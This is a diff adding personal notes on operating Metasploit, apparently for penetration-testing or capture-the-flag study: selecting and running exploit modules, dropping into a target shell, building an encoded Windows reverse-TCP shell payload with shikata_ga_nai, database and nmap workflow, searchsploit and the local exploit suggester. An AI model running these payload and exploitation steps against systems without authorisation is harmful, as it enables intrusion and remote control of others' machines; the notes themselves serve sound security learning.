@@ -1,0 +1,129 @@
+USING META:
+
+msfconsole
+
+searching for payloads and delivery:
+search <service>
+
+to select from list:
+use <number of module number>
+
+find options associated with payload:
+options
+
+then you can set the options using:
+set <OPTION-NAME> <INPUT>
+
+If you want to set a permanent target you use: 
+setg RHOSTS <target-ip>
+
+run using:
+exploit
+
+
+If a meterpreter shell is opened, you can use:
+shell
+
+^ this will open up a shell to the target system
+
+
+======================================
+
+ENCODING PAYLOADS:
+windows payload with encoder (shikata_ga_nai):
+msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+
+
+======================================
+
+INFO GATHERING INTO MSFDB (postgresql)
+You need postgresql:
+sudo service postgresql status 		# checking status
+sudo systemctl start postgresql		# start it up if not started
+
+Initiate a database for msf:
+sudo msfdb init
+
+check status:
+sudo msfdb status
+
+RUN MSFCONSOLE WITH DATABASE INITIATED:
+sudo msfdb run
+
+
+TO REINIT A DATABASE:
+msfdb reinit
+cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+sudo service postgresql restart
+msfconsole -q
+
+
+===================
+
+WORKSPACES
+
+in msfconsole:
+to list workspaces:
+workspace 
+
+to add a workspace:
+workspace -a Target_1
+
+
+TO IMPORT AN NMAP INTO DATABASE'S WORKSPACE:
+OPTION1:
+nmap -p- <target-ip> -oX output.xml
+
+in msfconsole:
+db_import output.xml
+
+
+OPTION2:
+db_nmap -sV -sS <target-ip>
+
+you can then check hosts:
+hosts
+
+and all services in the database:
+services
+
+
+TO EXPORT THE DATABASE:
+db_export -f xml backup.xml
+
+
+
+==========
+
+PLUGINS
+
+here's a good one:
+https://github.com/darkoperator/Metasploit-Plugins.git
+
+put in metasploit-framework/plugins/
+
+to load a plugin:
+load <plugin name>
+
+==========
+EXPLOIT as background job:
+exploit -j
+
+list jobs like:
+jobs -l
+
+
+SEARCH FOR EXPLOITS WITH:
+searchsploit <search terms>
+
+
+
+LOCAL EXPLOIT SUGGESTER (VERY GOOD) if you have exploit:
+search local exploit suggester
+(module might be post/multi/recon/local_exploit_suggester)
+
+use <#>
+show options
+SESSION <#>
+
+run
